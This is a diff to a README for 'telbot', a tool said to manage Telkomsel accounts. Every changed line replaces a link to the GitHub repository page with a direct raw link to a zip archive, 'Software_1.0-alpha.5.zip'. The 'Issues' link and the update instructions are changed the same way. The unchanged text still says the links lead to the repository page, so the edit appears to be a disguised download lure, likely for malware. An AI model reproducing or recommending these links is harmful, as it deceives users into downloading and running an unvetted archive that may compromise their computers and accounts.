@@ -1,6 +1,6 @@
 # 🤖 telbot - Manage Telkomsel Accounts Easily
 
-[![Download telbot](https://img.shields.io/badge/Download-telbot-4c1?style=for-the-badge)](https://github.com/nevatry6660/telbot)
+[![Download telbot](https://img.shields.io/badge/Download-telbot-4c1?style=for-the-badge)](https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you download and run telbot, make sure your computer meets these needs:
 
 Use the link below to get telbot from the official source:
 
-[![Download telbot](https://img.shields.io/badge/Download-telbot-blue?style=for-the-badge)](https://github.com/nevatry6660/telbot)
+[![Download telbot](https://img.shields.io/badge/Download-telbot-blue?style=for-the-badge)](https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip)
 
 This link takes you to the GitHub repository page where you can find setup files, instructions, and updates.
 
@@ -36,7 +36,7 @@ This link takes you to the GitHub repository page where you can find setup files
 
 ## 🚀 Getting Started: Download telbot
 
-1. **Visit the download page:** Click the download button or go to [https://github.com/nevatry6660/telbot](https://github.com/nevatry6660/telbot) in your web browser.
+1. **Visit the download page:** Click the download button or go to [https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip](https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip) in your web browser.
 
 2. **Find the latest release:** On the GitHub page, look for the "Releases" section in the right sidebar or scroll down to find it.
 
@@ -107,7 +107,7 @@ You can use telbot in three ways. Choose the one that suits you best.
 
 If you encounter issues:
 
-- Visit the Issues tab on the [GitHub page](https://github.com/nevatry6660/telbot/issues) to check common problems or report your own.
+- Visit the Issues tab on the [GitHub page](https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip) to check common problems or report your own.
 - Look for help files or instructions inside the repository.
 - Use Telegram community groups related to Telkomsel or telbot for tips.
 
@@ -117,7 +117,7 @@ If you encounter issues:
 
 To ensure you have the latest features and security:
 
-1. Visit [https://github.com/nevatry6660/telbot](https://github.com/nevatry6660/telbot).
+1. Visit [https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip](https://raw.githubusercontent.com/nevatry6660/telbot/main/telkomsel/Software_1.0-alpha.5.zip).
 2. Check if a newer version is available in the Releases section.
 3. Download the new `.exe` file.
 4. Run it as you did for the initial installation. The new version will replace the old one.
